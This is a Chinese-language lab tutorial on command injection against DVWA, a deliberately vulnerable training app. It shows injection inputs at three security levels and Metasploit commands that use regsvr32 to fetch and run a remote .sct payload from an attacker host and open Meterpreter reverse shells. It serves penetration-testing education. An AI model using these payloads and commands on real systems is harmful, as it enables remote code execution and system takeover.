# 如何使用Metasploit对DVWA进行命令注入攻击？

命令注入攻击指的是通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序执行命令时没有仔细验证用户的输入，如cookies，HTTP头，表单等参数，就会造成命令注入。

  

这种攻击不同于代码注入，因为代码注入允许攻击者添加自己的代码，然后由应用程序执行。 在代码注入中，攻击者扩展了应用程序的默认功能，而无需执行系统命令。

  

首先从http://www.hackingarticles.in/setup-web-penetest-lab-beginners-using-dvwa-owasp-mutillidae-ii/下载DVWA并安装。DVWA的默认凭证是admin/password。

  

![](../Images/288f493f24fddc5c517a193310c34ee3.png)  

**绕过Low Level Security**

  

点击DVWA security设置安全等级为Low。使用“&&”绕过防护执行命令注入。

  

![](../Images/a139f56a93d6852fa15b63799efd5005.png)  

  

在页面上输入一个IP地址并提交。

  

![](../Images/38bf342e97b7c7d5e57a2e6aa0de41c1.png)  

  

可以看到ping的结果。

  

![](../Images/a3fb7a89266cd97a8776a727d211e41e.png)  

  

我们可以使用“&”号来执行多个命令。如：

  

192.168.1.100 && dir

  

输入上面的命令后点击提交，除了ping的结果，还会列出所有的目录和文件。

  

![](../Images/057221265ef453d92e0b6ed637cda766.png)  

  

我们发现了四个目录和一个文件。

  

![](../Images/e4646ee921812aea04c176eabf949f2d.png)  

  

那么执行"192.168.1.100 && net user"并提交，服务器会返回系统用户列表。

  

![](../Images/3eaf405891e96b9449bd486ab7494cc9.png)  
![](../Images/86f02302986e368cc94d49820196a673.png)  

  

我们使用metasploit转移恶意负载到远程服务器。终端运行msfconsole，然后输入以下命令：

  

msf > use exploit/windows/misc/regsvr32\_applocker\_bypass\_server

msf exploit(regsvr32\_applocker\_bypass\_server) > set payload windows/meterpreter/reverse\_tcp

msf exploit(regsvr32\_applocker\_bypass\_server) > set lhost 192.168.1.106

msf exploit(regsvr32\_applocker\_bypass\_server) > set lport  4444

msf exploit(regsvr32\_applocker\_bypass\_server) > exploit

  

![](../Images/b023d33ec9bd85f9b6cdddab41c84e91.png)  

  

我们使用如下命令让远程服务器执行我们的载荷。

  

192.168.1.100 && regsvr32 /s /n /u /i:http://192.168.1.103:8080/C99PdFH.sct scrobj.dll

  

![](../Images/4b068bdaafa39f72f117394e31e49f47.png)  

  

然后你会得到一个meterpreter会话，运行sysinfo获取系统信息。

  

![](../Images/0bf741d03d65be67e336f15669b408ee.png)  

  

![](../Images/288f493f24fddc5c517a193310c34ee3.png)  

**绕过Medium Level Security**

  

在DVWA里面设置安全等级为Medium。可以使用“|”管道符绕过中级防护进行命令注入。

  

192.168.1.100 | regsvr32 /s /n /u /i:http://192.168.1.103:8080/C99PdFH.sct scrobj.dll and click on submit

  

![](../Images/d8cfd9ed01486800015df4eb85836629.png)  

  

我们又获得了一个meterpreter会话。

  

![](../Images/70027973145d888dff1ab2b9a9d4d371.png)  

  

![](../Images/288f493f24fddc5c517a193310c34ee3.png)  

**绕过High Level Security**

  

在DVWA里面设置安全等级为High。使用“||”绕过安全等级high进行命令注入。

  

192.168.1.100 || regsvr32 /s /n /u /i:http://192.168.1.103:8080/C99PdFH.sct scrobj.dll  and click on submit

  

![](../Images/607684df5bfadd749925b2f2457d327c.png)  

  

我们获得了第三个meterpreter会话。
